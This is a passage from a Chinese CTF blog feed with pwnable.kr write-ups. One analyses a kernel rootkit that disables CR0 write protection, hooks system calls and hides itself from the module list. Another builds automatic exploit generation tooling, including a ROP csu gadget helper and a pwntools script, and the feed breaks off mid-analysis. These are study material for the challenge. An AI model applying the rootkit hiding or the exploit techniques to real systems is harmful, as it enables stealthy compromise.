<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题真的让我大跌眼镜，感觉这两天的分析完全白干了……</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr rootkit 未完全解</title>
    <url>/2020/01/27/pwnable-kr-rootkit-%E6%9C%AA%E5%AE%8C%E5%85%A8%E8%A7%A3/</url>
    <content><![CDATA[<p>偏向简单的一题</p>
<a id="more"></a>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html" target="_blank" rel="noopener">http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html</a></p>
<p><a href="https://github.com/DoubleLabyrinth/pwnable.kr/tree/master/Grotesque/rootkit" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/pwnable.kr/tree/master/Grotesque/rootkit</a></p>
<p><a href="https://habr.com/en/post/437182/" target="_blank" rel="noopener">https://habr.com/en/post/437182/</a></p>
<h2 id="rootkit-ko"><a href="#rootkit-ko" class="headerlink" title="rootkit.ko"></a>rootkit.ko</h2><h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>首先查看<code>initmodule</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initmodule</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sct = <span class="number">0xC15FA020</span>;</span><br><span class="line">  sys_open = MEMORY[<span class="number">0xC15FA034</span>];</span><br><span class="line">  sys_openat = MEMORY[<span class="number">0xC15FA4BC</span>];</span><br><span class="line">  sys_symlink = MEMORY[<span class="number">0xC15FA16C</span>];</span><br><span class="line">  sys_symlinkat = MEMORY[<span class="number">0xC15FA4E0</span>];</span><br><span class="line">  sys_link = MEMORY[<span class="number">0xC15FA044</span>];</span><br><span class="line">  sys_linkat = MEMORY[<span class="number">0xC15FA4DC</span>];</span><br><span class="line">  sys_rename = MEMORY[<span class="number">0xC15FA0B8</span>];</span><br><span class="line">  sys_renameat = (<span class="keyword">int</span> (__cdecl *)(_DWORD, _DWORD, _DWORD))MEMORY[<span class="number">0xC15FA4D8</span>];</span><br><span class="line">  wp();</span><br><span class="line">  v0 = (_DWORD *)sct;</span><br><span class="line">  *(_DWORD *)(sct + <span class="number">20</span>) = sys_open_hooked;</span><br><span class="line">  v0[<span class="number">295</span>] = sys_openat_hooked;</span><br><span class="line">  v0[<span class="number">83</span>] = sys_symlink_hooked;</span><br><span class="line">  v0[<span class="number">304</span>] = sys_symlinkat_hooked;</span><br><span class="line">  v0[<span class="number">9</span>] = sys_link_hooked;</span><br><span class="line">  v0[<span class="number">303</span>] = sys_linkat_hooked;</span><br><span class="line">  v0[<span class="number">38</span>] = sys_rename_hooked;</span><br><span class="line">  v0[<span class="number">302</span>] = sys_renameat_hooked;</span><br><span class="line">  wp();</span><br><span class="line">  v1 = (_DWORD *)_this_module[<span class="number">2</span>];</span><br><span class="line">  v2 = _this_module[<span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)(v2 + <span class="number">4</span>) = v1;</span><br><span class="line">  *v1 = v2;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  _this_module[<span class="number">1</span>] = &amp;_this_module[<span class="number">1</span>];</span><br><span class="line">  _this_module[<span class="number">2</span>] = &amp;_this_module[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所谓的<code>sct</code>就是<code>sys_call_table</code>，然后剩下的那些也不难理解</p>
<p>系统调用在<code>sct</code>中存储的顺序应该和他们的调用号是一致的</p>
<p>这里的意思就是它将原本的系统调用更换为了hook函数</p>
<p>最下面的几个指针的操作，上面的那个是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del(struct list_head * prev, struct list_head * next)</span><br><span class="line">&#123;</span><br><span class="line"> next-&gt;prev = prev;</span><br><span class="line"> prev-&gt;next = next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面这个是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">INIT_LIST_HEAD</span><span class="params">(struct list_head *<span class="built_in">list</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">list</span>-&gt;next = <span class="built_in">list</span>;</span><br><span class="line"> <span class="built_in">list</span>-&gt;prev = <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目的是为了让我们不能用<code>lsmod</code>或者<code>/proc/modules</code>，<code>/sys/module/</code>等方式找出其加载了哪些模块</p>
<p>至于<code>wp</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">wp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST00_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = mcount();</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __readcr0();</span><br><span class="line">    __writecr0(v4 | <span class="number">0x10000</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v0;</span><br><span class="line">    v2 = __readcr0();</span><br><span class="line">    __writecr0(v2 &amp; <span class="number">0xFFFEFFFF</span>);</span><br><span class="line">    result = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>cr0</code>寄存器或<code>0x10000</code>是为了开启写保护</p>
<p><code>cr0</code>寄存去与<code>0xffeffff</code>就是为了关闭写保护</p>
<p>关闭了写保护才能往<code>sct</code>里面写</p>
<p>至于<code>mcount</code>，我估测其作用就是一个全局的计数第一次返回0，随后递增</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>我用<code>objdump</code>的时候发现好多的call以及变量是0，随后才研究出来，其有多个<code>rel.xxxx</code>的<code>section</code>，其中就有某偏移的一个<code>Dword</code>所对应的<code>symtab</code>的项，理论上来说修改这个<code>section</code>就可以修改程序了</p>
<p>但是我尝试了一次把所有的hook函数变回原来的函数的之后，<code>insmod</code>会让系统崩溃，咱也菜，也不知道啥原因</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cat ./t.sh</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sed -i $<span class="string">'s/\x01\x1f/\x01\x1b/g'</span> <span class="variable">$1</span></span><br><span class="line">sed -i $<span class="string">'s/\x01\x1c/\x01\x1d/g'</span> <span class="variable">$1</span></span><br><span class="line">sed -i <span class="string">'s/rootkit/hhacked/g'</span> <span class="variable">$1</span></span><br><span class="line">sed -i $<span class="string">'s/\x02\x20/\x02\x04/g'</span> <span class="variable">$1</span></span><br></pre></td></tr></table></figure>

<h3 id="别人的解决方法"><a href="#别人的解决方法" class="headerlink" title="别人的解决方法"></a>别人的解决方法</h3><p>重写一个.ko，然后重新编译，压缩加密之后传过去</p>
<p>但是由于墙的原因，这样的方法对于我们来说有些不合适，因为你复制粘贴的过程你必须分段传，一次还不能粘贴太多，因为太多的话中间可能会断导致数据丢失……</p>
<p>这道题也没开nc的端口，所以这条道因为太麻烦我就不试了……</p>
<p>ps: scanf的缓冲区是4096个字节</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr aeg自解</title>
    <url>/2020/01/23/pwnable-kr-aeg%E8%87%AA%E8%A7%A3/</url>
    <content><![CDATA[<p>最近想要学习自动化解题技术，于是选择了pwnable.kr的aeg一题进行学习</p>
<a id="more"></a>

<h1 id="何为AEG"><a href="#何为AEG" class="headerlink" title="何为AEG"></a>何为AEG</h1><p>AEG全称为Automatic Exploit Generation，意如其名，旨在考验答题者的自动化解题能力</p>
<p>通常AEG的题目的解题过程是这样的：</p>
<ul>
<li>连接到远程端，远程端会发送过来一串base64加密的字符串</li>
<li>接收字符串，进行解密，将解密后的数据保存到本地，得到一个压缩文件</li>
<li>对文件进行解压，得到可执行二进制文件</li>
<li>此时有10秒钟的时间来生成shellcode，时间一过，连接自动断开</li>
</ul>
<p>每次连接所得到的二进制文件都大体相同，但其中存在着许多细节上的不同</p>
<p>因此这里自动化解题的对象并不是一类题，只能说是一道题，因此只需要写出一个针对当前题目的自动生成payload的脚本即可，难度要相对小一些</p>
<h1 id="pwnable-kr-aeg"><a href="#pwnable-kr-aeg" class="headerlink" title="pwnable.kr aeg"></a>pwnable.kr aeg</h1><p>这道题位于Grotesque区，属于中等难度的pwn题目</p>
<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>先连接一次，得到一个可执行文件，checksec检测一次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">"rm -rf ./recv.bin, ./recv.decoded"</span>)</span><br><span class="line">io = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9005</span>)</span><br><span class="line">io.recvuntil(<span class="string">'wait...\n'</span>)</span><br><span class="line">data = io.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"recv.bin"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'zcat ./recv.bin &gt; ./recv.decoded'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] '/ctf/work/recv.decoded'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>发现只开启了NX，表明可能存在栈溢出漏洞</p>
<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>IDA打开之后，进去找到main函数，然后F5万能大法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+11h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+12h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_4565995(<span class="number">1L</span>L, <span class="number">2L</span>L, <span class="number">3L</span>L, <span class="number">4L</span>L, <span class="number">5L</span>L, <span class="number">6L</span>L);</span><br><span class="line">    srand(v4);</span><br><span class="line">    dword_476772C = <span class="built_in">strlen</span>(a2[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_476772C &lt;= <span class="number">1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">2</span> * dword_476772C &gt; v15 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = a2[<span class="number">1</span>][v15];</span><br><span class="line">        v8 = a2[<span class="number">1</span>][v15 + <span class="number">1</span>];</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v5 = v14++;</span><br><span class="line">        __isoc99_sscanf(&amp;v7, <span class="string">"%02x"</span>, &amp;byte_4767740[v5]);</span><br><span class="line">        v15 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_476772C; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v10 == <span class="number">72</span> &amp;&amp; (_BYTE)v13 == <span class="number">64</span> &amp;&amp; <span class="number">78</span> * (_BYTE)v13 + <span class="number">51</span> * (_BYTE)v10 - (_BYTE)v12 == <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v13++;</span><br><span class="line">          v12 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">          byte_4767740[i] ^= <span class="number">0x44</span>u;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          byte_4767740[i] ^= <span class="number">0x7C</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"payload encoded. let's go!"</span>);</span><br><span class="line">      sub_45658F0((<span class="keyword">unsigned</span> __int8)byte_4767740[<span class="number">0</span>], (<span class="keyword">unsigned</span> __int8)byte_4767741, (<span class="keyword">unsigned</span> __int8)byte_4767742);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"end of program"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"payload length exceeds 1000byte"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"usage : ./aeg [hex encoded payload]"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>流程是这样的：</p>
<ul>
<li>检查是否有一个命令行的参数，如果否，则打印usage然后退出</li>
<li>检查参数的长度除以2放入<code>dword_476772C</code>，检测其是否小于等于1000，如果否，则退出</li>
<li>在while循环中，将我们的输入以如下规则转换：字符串的<code>&quot;ab&quot;</code>转换成数字<code>0xab</code>，即两个字节转换成一个字节，放入<code>byte_4767740</code>中</li>
<li>在for循环中，能看到好几句if，但大多数的if是无用操作，用来混淆视听，唯一有用的地方是<code>i&amp;1</code>判断处的<code>if else</code>，这里对输入进行一系列异或加密</li>
<li>加密完之后，执行<code>sub_45658F0</code>函数</li>
</ul>
<h2 id="sub-45658F0函数"><a href="#sub-45658F0函数" class="headerlink" title="sub_45658F0函数"></a><code>sub_45658F0</code>函数</h2><p>第一处函数调用，其参数为加密后的输入前三个字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_45658F0((<span class="keyword">unsigned</span> __int8)byte_4767740[<span class="number">0</span>], (<span class="keyword">unsigned</span> __int8)byte_4767741, (<span class="keyword">unsigned</span> __int8)byte_4767742);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_45658F0</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xE4</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0x4C</span> - a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x1E</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0x24</span> * a1 + <span class="number">0x29</span> * a2 - a3;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">0x62</span> )</span><br><span class="line">        result = sub_4565870(</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767743,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767744,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767745);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对第一个字节，检测其是否等于<code>0xE4</code></p>
<p>对第二个字节，检测式子<code>0x4C - a2 == 0x1E</code>是否成立</p>
<p>对第三个字节，检测式子<code>0x24 * a1 + 0x29 * a2 - a3 == 0x62</code>是否成立</p>
<p>全部成立之后，进入<code>sub_4565870</code>函数，参数是加密后的输入的第四、五、六个字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_4565870</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDB</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0x5A</span> - a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x37</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0x26</span> * a1 + <span class="number">0x25</span> * a2 - a3;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">0x2A</span> )</span><br><span class="line">        result = sub_45657F3(</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767746,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767747,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767748);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处可以看到，这里是套娃式检测，但是检测的条件都变了</p>
<p>就这样一环套一环，一直到最后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sub_45651C1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest, &amp;unk_4767770, dword_476772C - <span class="number">48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>unk_4767770</code>相对加密后输入<code>byte_4767740</code>偏移0x30，<code>dword_476772C</code>是最开始保存的输入长度除以2</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里我主要使用了<code>z3 barf</code>这两个库</p>
<h3 id="分析得到main函数的basic-blocks"><a href="#分析得到main函数的basic-blocks" class="headerlink" title="分析得到main函数的basic blocks"></a>分析得到main函数的basic blocks</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">binary_name = <span class="string">'./recv.decoded'</span></span><br><span class="line">barf = barf.BARF(binary_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_main_address</span><span class="params">()</span>:</span></span><br><span class="line">    cfg = barf.recover_cfg()</span><br><span class="line">    start_block = cfg.basic_blocks[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> start_block.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'rdi'</span>:</span><br><span class="line">            main_address = int(instr.operands[<span class="number">1</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> main_address</span><br><span class="line">main_address = get_main_address()</span><br><span class="line">cfg = barf.recover_cfg(start=main_address)</span><br><span class="line">basic_blocks = cfg.basic_blocks</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_block</span><span class="params">(addr, basic_blocks)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    从basic blocks中查找以addr为起始地址的block</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"[-] address can not be None!"</span>)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> basic_blocks:</span><br><span class="line">        <span class="keyword">if</span> block.address == addr:</span><br><span class="line">            <span class="keyword">return</span> block</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">"[-] can not find it!"</span>)</span><br></pre></td></tr></table></figure>

<p>我们要从main函数开始分析，所以这一步是必要的</p>
<h3 id="分析得到init-csu的gadget的地址"><a href="#分析得到init-csu的gadget的地址" class="headerlink" title="分析得到init_csu的gadget的地址"></a>分析得到init_csu的gadget的地址</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_init_address</span><span class="params">()</span>:</span></span><br><span class="line">    cfg = barf.recover_cfg()</span><br><span class="line">    start_block = cfg.basic_blocks[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> start_block.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'rcx'</span>:</span><br><span class="line">            init_address = int(instr.operands[<span class="number">1</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> init_address</span><br><span class="line">init_address = get_init_address()</span><br><span class="line">init_offset1 = <span class="number">0x5a</span></span><br><span class="line">init_offset2 = <span class="number">0x40</span></span><br><span class="line">init_addr1 = init_address + init_offset1</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">pop     rbx</span></span><br><span class="line"><span class="string">pop     rbp</span></span><br><span class="line"><span class="string">pop     r12</span></span><br><span class="line"><span class="string">pop     r13</span></span><br><span class="line"><span class="string">pop     r14</span></span><br><span class="line"><span class="string">pop     r15</span></span><br><span class="line"><span class="string">retn</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">init_addr2 = init_address + init_offset2</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">mov     rdx, r13</span></span><br><span class="line"><span class="string">mov     rsi, r14</span></span><br><span class="line"><span class="string">mov     edi, r15d</span></span><br><span class="line"><span class="string">call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">add     rbx, 1</span></span><br><span class="line"><span class="string">cmp     rbx, rbp</span></span><br><span class="line"><span class="string">jnz     short loc_8731CF0</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, rdx, rsi, rdi)</span>:</span></span><br><span class="line">    gadget = <span class="string">''</span></span><br><span class="line">    gadget += p64(rbx) + p64(rbp) + p64(r12)</span><br><span class="line">    gadget += p64(rdx) + p64(rsi) + p64(rdi)</span><br><span class="line">    <span class="keyword">return</span> gadget</span><br></pre></td></tr></table></figure>

<p>因为源程序中并没有什么可用的gadget，因此使用这里，且这里也相对好找一些</p>
<h3 id="分析得到加密后数据所在的地址"><a href="#分析得到加密后数据所在的地址" class="headerlink" title="分析得到加密后数据所在的地址"></a>分析得到加密后数据所在的地址</h3><p>用IDA的CFG视图对main函数进行查看，可以发现，得到数据地址的块需要走的路径为：</p>
<figure class="image-box">
                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152129633.png" alt="image-20200123152129633" title class>
                <p>image-20200123152129633</p>
            </figure>

<p>即<code>start -&gt; taken_branch -&gt; taken_branch -&gt; direct_branch -&gt; taken_branch</code></p>
<p>这里我们可以发现，最后一次取<code>taken_branch</code>之后，相当于进入了while循环，所以我们还得保存住那里的<code>not_taken_branch</code>以便直接走出循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = find_block(basic_blocks[<span class="number">0</span>].taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.direct_branch, basic_blocks)</span><br><span class="line">not_taken_branch = block.not_taken_branch <span class="comment"># 为了走出循环</span></span><br><span class="line">block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">        index -= <span class="number">5</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">instr = block.instrs[index]</span><br><span class="line">inp_address = int(instr.operands[<span class="number">1</span>].to_string()[<span class="number">5</span>:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">call sscanf的之前第五个指令的第二个操作数就包含了加密后数据的地址</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h3 id="得到加密部分所异或的值"><a href="#得到加密部分所异或的值" class="headerlink" title="得到加密部分所异或的值"></a>得到加密部分所异或的值</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">	byte_4767740[i] ^= <span class="number">0x44</span>u;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    byte_4767740[i] ^= <span class="number">0x7C</span>u;</span><br></pre></td></tr></table></figure>

<p>此处意为，index为奇数，就异或<code>0x44</code>，为偶数，就异或<code>0x7C</code></p>
<p>因为加密操作在for循环中，所以我们要保存一个退出for循环的branch</p>
<figure class="image-box">
                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123151950205.png" alt="image-20200123151950205" title class>
                <p>image-20200123151950205</p>
            </figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = find_block(not_taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.direct_branch, basic_blocks)</span><br><span class="line">not_taken_branch = block.not_taken_branch</span><br></pre></td></tr></table></figure>

<p>先找到异或加密的块：</p>
<p>由于全局只有这里一处存在<code>and</code>操作所以可以从<code>basic blocks</code>中搜索目标<code>and eax, 1</code>，就可以得到<code>xor</code>指令附近的块</p>
